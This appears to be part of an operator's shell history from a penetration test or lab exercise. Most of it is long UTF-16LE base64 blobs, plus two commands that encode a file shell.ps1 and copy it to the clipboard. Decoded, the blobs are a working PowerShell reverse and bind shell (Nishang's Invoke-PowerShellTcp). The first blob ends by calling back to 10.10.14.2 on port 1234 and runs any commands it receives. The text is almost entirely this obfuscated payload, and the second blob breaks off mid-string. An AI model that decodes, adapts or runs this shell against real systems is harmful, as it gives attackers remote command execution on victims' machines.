CAAIAAgAH0ACgAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgAgACAAIAAgACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0ACgAKACAAIAAgACAAIAAgACAAIAAjAFMAZQBuAGQAIABiAGEAYwBrACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAbgBhAG0AZQAgAGEAbgBkACAAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUACgAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAeQB0AGUAcwAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACIAVwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgACIAIAArACAAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAgACsAIAAiACAAbwBuACAAIgAgACsAIAAkAGUAbgB2ADoAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAArACAAIgBgAG4AQwBvAHAAeQByAGkAZwBoAHQAIAAoAEMAKQAgADIAMAAxADUAIABNAGkAYwByAG8AcwBvAGYAdAAgAEMAbwByAHAAbwByAGEAdABpAG8AbgAuACAAQQBsAGwAIAByAGkAZwBoAHQAcwAgAHIAZQBzAGUAcgB2AGUAZAAuAGAAbgBgAG4AIgApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAIwBTAGgAbwB3ACAAYQBuACAAaQBuAHQAZQByAGEAYwB0AGkAdgBlACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHAAcgBvAG0AcAB0AAoAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlAHMAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAnAFAAUwAgACcAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAnAD4AJwApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABFAG4AYwBvAGQAZQBkAFQAZQB4AHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAkAEUAbgBjAG8AZABlAGQAVABlAHgAdAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBFAHgAZQBjAHUAdABlACAAdABoAGUAIABjAG8AbQBtAGEAbgBkACAAbwBuACAAdABoAGUAIAB0AGEAcgBnAGUAdAAuAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgAC0AQwBvAG0AbQBhAG4AZAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0AVwBhAHIAbgBpAG4AZwAgACIAUwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAkAF8ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACcAPgAgACcACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHgAIAA9ACAAKAAkAGUAcgByAG8AcgBbADAAXQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGUAcgByAG8AcgAuAGMAbABlAGEAcgAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrADIAIAArACAAJAB4AAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAFIAZQB0AHUAcgBuACAAdABoAGUAIAByAGUAcwB1AGwAdABzAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAbABpAHMAdABlAG4AZQByACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAFcAYQByAG4AaQBuAGcAIAAiAFMAbwBtAGUAdABoAGkAbgBnACAAdwBlAG4AdAAgAHcAcgBvAG4AZwAhACAAQwBoAGUAYwBrACAAaQBmACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAGkAcwAgAHIAZQBhAGMAaABhAGIAbABlACAAYQBuAGQAIAB5AG8AdQAgAGEAcgBlACAAdQBzAGkAbgBnACAAdABoAGUAIABjAG8AcgByAGUAYwB0ACAAcABvAHIAdAAuACIACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ARQByAHIAbwByACAAJABfAAoAIAAgACAAIAB9AAoACgB9AAoACgBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAAIAAtAFIAZQB2AGUAcgBzAGUAIAAtAEkAUABBAGQAZAByAGUAcwBzACAAMQAwAC4AMQAwAC4AMQA0AC4AMgAgAC0AUABvAHIAdAAgADEAMgAzADQACgA=
 6827  2020-11-16 07:05  cat shell.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection primary
 6828  2020-11-16 07:06  cat shell.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
 6829  2020-11-16 07:06  ZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAAoAewAKADwAIwAKAC4AUwBZAE4ATwBQAFMASQBTAAoATgBpAHMAaABhAG4AZwAgAHMAYwByAGkAcAB0ACAAdwBoAGkAYwBoACAAYwBhAG4AIABiAGUAIAB1AHMAZQBkACAAZgBvAHIAIABSAGUAdgBlAHIAcwBlACAAbwByACAAQgBpAG4AZAAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABmAHIAbwBtACAAYQAgAHQAYQByAGcAZQB0AC4ACgAKAC4ARABFAFMAQwBSAEkAUABUAEkATwBOAAoAVABoAGkAcwAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBiAGwAZQAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIABhACAAcwB0AGEAbgBkAGEAcgBkACAAbgBlAHQAYwBhAHQAIABsAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAGEAIABwAG8AcgB0ACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAKAEEAbABzAG8ALAAgAGEAIABzAHQAYQBuAGQAYQByAGQAIABuAGUAdABjAGEAdAAgAGMAYQBuACAAYwBvAG4AbgBlAGMAdAAgAHQAbwAgAHQAaABpAHMAIABzAGMAcgBpAHAAdAAgAEIAaQBuAGQAIAB0AG8AIABhACAAcwBwAGUAYwBpAGYAaQBjACAAcABvAHIAdAAuAAoACgBUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAZABlAHIAaQB2AGUAZAAgAGYAcgBvAG0AIABQAG8AdwBlAHIAZgB1AG4AIAB3AHIAaQB0AHQAZQBuACAAYgB5ACAAQgBlAG4AIABUAHUAcgBuAGUAcgAgACYAIABEAGEAdgBlACAASABhAHIAZAB5AAoACgAuAFAAQQBSAEEATQBFAFQARQBSACAASQBQAEEAZABkAHIAZQBzAHMACgBUAGgAZQAgAEkAUAAgAGEAZABkAHIAZQBzAHMAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAKAAoALgBQAEEAUgBBAE0ARQBUAEUAUgAgAFAAbwByAHQACgBUAGgAZQAgAHAAbwByAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAgAFcAaABlAG4AIAB1AHMAaQBuAGcAIAAtAEIAaQBuAGQAIABpAHQAIABpAHMAIAB0AGgAZQAgAHAAbwByAHQAIABvAG4AIAB3AGgAaQBjAGgAIAB0AGgAaQBzACAAcwBjAHIAaQBwAHQAIABsAGkAcwB0AGUAbgBzAC4ACgAKAC4ARQBYAEEATQBQAEwARQAKAFAAUwAgAD4AIABJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAAIAAtAFIAZQB2AGUAcgBzAGUAIAAtAEkAUABBAGQAZAByAGUAcwBzACAAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMgAxADcAIAAtAFAAbwByAHQAIAAxADIAMwA0AAoACgBBAGIAbwB2AGUAIABzAGgAbwB3AHMAIABhAG4AIABlAHgAYQBtAHAAbABlACAAbwBmACAAYQBuACAAaQBuAHQAZQByAGEAYwB0AGkAdgBlACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHIAZQB2AGUAcgBzAGUAIABjAG8AbgBuAGUAYwB0ACAAcwBoAGUAbABsAC4AIABBACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIABsAGkAcwB0AGUAbgBlAHIAIABtAHUAcwB0ACAAYgBlACAAbABpAHMAdABlAG4AaQBuAGcAIABvAG4ACgB0AGgAZQAgAGcAaQB2AGUAbgAgAEkAUAAgAGEAbgBkACAAcABvAHIAdAAuAAoACgAuAEUAWABBAE0AUABMAEUACgBQAFMAIAA+ACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBCAGkAbgBkACAALQBQAG8AcgB0ACAANAA0ADQANAAKAAoAQQBiAG8AdgBlACAAcwBoAG8AdwBzACAAYQBuACAAZQB4AGEAbQBwAGwAZQAgAG8AZgAgAGEAbgAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABiAGkAbgBkACAAYwBvAG4AbgBlAGMAdAAgAHMAaABlAGwAbAAuACAAVQBzAGUAIABhACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdABoAGkAcwAgAHAAbwByAHQALgAKAAoALgBFAFgAQQBNAFAATABFAAoAUABTACAAPgAgAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAgAC0AUgBlAHYAZQByAHMAZQAgAC0ASQBQAEEAZABkAHIAZQBzAHMAIABmAGUAOAAwADoAOgAyADAAYwA6ADIAOQBmAGYAOgBmAGUAOQBkADoAYgA5ADgAMwAgAC0AUABvAHIAdAAgADQANAA0ADQACgAKAEEAYgBvAHYAZQAgAHMAaABvAHcAcwAgAGEAbgAgAGUAeABhAG0AcABsAGUAIABvAGYAIABhAG4AIABpAG4AdABlAHIAYQBjAHQAaQB2AGUAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcgBlAHYAZQByAHMAZQAgAGMAbwBuAG4AZQBjAHQAIABzAGgAZQBsAGwAIABvAHYAZQByACAASQBQAHYANgAuACAAQQAgAG4AZQB0AGMAYQB0AC8AcABvAHcAZQByAGMAYQB0ACAAbABpAHMAdABlAG4AZQByACAAbQB1AHMAdAAgAGIAZQAKAGwAaQBzAHQAZQBuAGkAbgBnACAAbwBuACAAdABoAGUAIABnAGkAdgBlAG4AIABJAFAAIABhAG4AZAAgAHAAbwByAHQALgAKAAoALgBMAEkATgBLAAoAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAGwAYQBiAG8AZgBhAHAAZQBuAGUAdAByAGEAdABpAG8AbgB0AGUAcwB0AGUAcgAuAGMAbwBtAC8AMgAwADEANQAvADAANQAvAHcAZQBlAGsALQBvAGYALQBwAG8AdwBlAHIAcwBoAGUAbABsAC0AcwBoAGUAbABsAHMALQBkAGEAeQAtADEALgBoAHQAbQBsAAoAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBuAGUAdAB0AGkAdAB1AGQAZQAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALwBiAGwAbwBiAC8AbQBhAHMAdABlAHIALwBwAG8AdwBlAHIAZgB1AG4ALgBwAHMAMQAKAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcwBhAG0AcgBhAHQAYQBzAGgAbwBrAC8AbgBpAHMAaABhAG4AZwAKACMAPgAKACAAIAAgACAAWwBDAG0AZABsAGUAdABCAGkAbgBkAGkAbgBnACgARABlAGYAYQB1AGwAdABQAGEAcgBhAG0AZQB0AGUAcgBTAGUAdABOAGEAbQBlAD0AIgByAGUAdgBlAHIAcwBlACIAKQBdACAAUABhAHIAYQBtACgACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADAALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADAALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAZgBhAGwAcwBlACwAIABQAGEAcgBhAG0AZQB0AGUAcgBTAGUAdABOAGEAbQBlAD0AIgBiAGkAbgBkACIAKQBdAAoAIAAgACAAIAAgACAAIAAgAFsAUwB0AHIAaQBuAGcAXQAKACAAIAAgACAAIAAgACAAIAAkAEkAUABBAGQAZAByAGUAcwBzACwACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADEALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuACAAPQAgADEALAAgAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAYgBpAG4AZAAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAEkAbgB0AF0ACgAgACAAIAAgACAAIAAgACAAJABQAG8AcgB0ACwACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFMAdwBpAHQAYwBoAF0ACgAgACAAIAAgACAAIAAgACAAJABSAGUAdgBlAHIAcwBlACwACgAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAYgBpAG4AZAAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFMAdwBpAHQAYwBoAF0ACgAgACAAIAAgACAAIAAgACAAJABCAGkAbgBkAAoACgAgACAAIAAgACkACgAKAAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAjAEMAbwBuAG4AZQBjAHQAIABiAGEAYwBrACAAaQBmACAAdABoAGUAIAByAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgAIABpAHMAIAB1AHMAZQBkAC4ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAFIAZQB2AGUAcgBzAGUAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACQASQBQAEEAZABkAHIAZQBzAHMALAAkAFAAbwByAHQAKQAKACAAIAAgACAAIAAgACAAIAB9AAoACgAgACAAIAAgACAAIAAgACAAIwBCAGkAbgBkACAAdABvACAAdABoAGUAIABwAHIAbwB2AGkAZABlAGQAIABwAG8AcgB0ACAAaQBmACAAQgBpAG4AZAAgAHMAdwBpAHQAYwBoACAAaQBzACAAdQBzAGUAZAAuAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABCAGkAbgBkACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABMAGkAcwB0AGUAbgBlAHIAXQAkAFAAbwByAHQACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGwAaQBzAHQAZQBuAGUAcgAuAHMAdABhAHIAdAAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0ACAAPQAgACQAbABpAHMAdABlAG4AZQByAC4AQQBjAGMAZQBwAHQAVABjAHAAQwBsAGkAZQBuAHQAKAApAAoAIAAgACAAIAAgACAAIAAgAH0ACgAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgAgACAAIAAgACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0ACgAKACAAIAAgACAAIAAgACAAIAAjAFMAZQBuAGQAIABiAGEAYwBrACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAbgBhAG0AZQAgAGEAbgBkACAAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUACgAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAeQB0AGUAcwAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACIAVwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgACIAIAArACAAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAgACsAIAAiACAAbwBuACAAIgAgACsAIAAkAGUAbgB2ADoAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAArACAAIgBgAG4AQwBvAHAAeQByAGkAZwBoAHQAIAAoAEMAKQAgADIAMAAxADUAIABNAGkAYwByAG8AcwBvAGYAdAAgAEMAbwByAHAAbwByAGEAdABpAG8AbgAuACAAQQBsAGwAIAByAGkAZwBoAHQAcwAgAHIAZQBzAGUAcgB2AGUAZAAuAGAAbgBgAG4AIgApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAIwBTAGgAbwB3ACAAYQBuACAAaQBuAHQAZQByAGEAYwB0AGkAdgBlACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHAAcgBvAG0AcAB0AAoAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlAHMAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAnAFAAUwAgACcAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAnAD4AJwApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABFAG4AYwBvAGQAZQBkAFQAZQB4AHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAkAEUAbgBjAG8AZABlAGQAVABlAHgAdAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBFAHgAZQBjAHUAdABlACAAdABoAGUAIABjAG8AbQBtAGEAbgBkACAAbwBuACAAdABoAGUAIAB0AGEAcgBnAGUAdAAuAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgAC0AQwBvAG0AbQBhAG4AZAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0AVwBhAHIAbgBpAG4AZwAgACIAUwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAkAF8ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACcAPgAgACcACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHgAIAA9ACAAKAAkAGUAcgByAG8AcgBbADAAXQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGUAcgByAG8AcgAuAGMAbABlAGEAcgAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrADIAIAArACAAJAB4AAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAFIAZQB0AHUAcgBuACAAdABoAGUAIAByAGUAcwB1AGwAdABzAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAbABpAHMAdABlAG4AZQByACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAFcAYQByAG4AaQBuAGcAIAAiAFMAbwBtAGUAdABoAG